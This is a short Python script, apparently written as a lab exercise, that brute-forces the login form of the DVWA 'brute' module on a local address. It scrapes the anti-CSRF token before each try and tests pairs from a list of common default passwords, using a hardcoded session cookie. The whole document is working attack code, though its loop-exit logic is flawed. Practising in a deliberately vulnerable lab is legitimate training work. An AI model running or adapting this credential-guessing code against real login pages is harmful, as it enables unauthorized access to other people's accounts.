#!/usr/bin/python3
#@author: manu
import requests

import random
import urllib3
from bs4 import BeautifulSoup
cookie={"PHPSESSID":"ai7b48dmske0qd3d29986da822","security":"high"}


lista_passwords=["admin","password","manager","letmein","cisco","default","root","apc","pass","security","user","system","sys"]

sesion=requests.session()




#deshabilitar el problema con las peticiones
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
for x in range(len(lista_passwords)):
    for j in range(len(lista_passwords)):
        url="http://127.8.0.1/vulnerabilities/brute/index.php"
        pagina_token=requests.get(url,cookies=cookie)
        buscar_csrf=BeautifulSoup(pagina_token.text,'lxml')
        obtener_token=buscar_csrf.find('input', type='hidden').get('value')
        url=f'http://127.8.0.1/vulnerabilities/brute/index.php?username={lista_passwords[x]}&password={lista_passwords[j]}&Login=Login&user_token={obtener_token}#'
        peticion=requests.get(url,cookies=cookie)


        print(url)
        #print(peticion.text)




        if "Username and/or password incorrect." in peticion.text:
            print("contraseña probada",lista_passwords[x],lista_passwords[j])
            pass
        else:
                print("contraseña encontrada",lista_passwords[x],lista_passwords[j])
                break
                break
                print("break")
            
